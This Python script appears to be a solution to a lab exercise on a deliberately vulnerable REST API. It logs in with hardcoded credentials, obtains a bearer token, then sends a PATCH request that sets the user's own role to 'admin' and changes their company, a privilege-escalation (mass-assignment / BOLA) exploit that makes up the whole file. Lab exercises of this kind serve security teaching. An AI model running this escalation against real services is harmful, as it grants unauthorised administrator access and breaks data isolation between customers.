import requests
from requests.auth import HTTPBasicAuth

# === Global Variables ===
USERNAME = "natasha_romanoff"
PASSWORD = "blackwidow456"

# === API Base URL ===
BASE_URL = "https://rest.e-hacking.de/rest-api-sec/vuln_users"


def authenticate(username: str, password: str):
    """
    Authenticate with Basic Auth to fetch a Bearer token.
    """
    url = f"{BASE_URL}/authenticate?verifier=bola-2"
    response = requests.post(url, data={"username": username, "password": password})
    response.raise_for_status()
    print(response.json())
    token = response.json().get("access_token")
    id = response.json().get("id")
    name = response.json().get("name")
    if not token:
        raise ValueError("Authentication failed or no access token received.")
    return token, id, name


def get_user_info(token: str):
    """
    Get the authenticated user's information using /users/user.
    """
    url = f"{BASE_URL}/users/user?verifier=bola-2"
    headers = {"authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    print(response.json())
    response.raise_for_status()
    return response.json()


def patch_user_info(
    token: str,
    id: int,
    username: str = USERNAME,
    password: str = PASSWORD,
    company_id: int = 0,
    role: str = "admin",
):
    """
    Get the authenticated user's information using /users/user.
    """
    url = f"{BASE_URL}/users/user?verifier=bola-2"
    headers = {"authorization": f"Bearer {token}"}
    data = {
        "user_id": id,
        "username": username,
        "password": password,
        "company_id": company_id,
        "role": role,
    }
    response = requests.patch(url, headers=headers, data=data)
    print(response.json())
    response.raise_for_status()
    print(response.json())


def main():
    print("[*] Authenticating...")
    token, id, name = authenticate(USERNAME, PASSWORD)
    print(f"[+] Access Token: {token}")

    print("[*] Get user info...")
    get_user_info(token)

    print("[*] Patching user info...")
    patch_user_info(token, id, name)


if __name__ == "__main__":
    main()
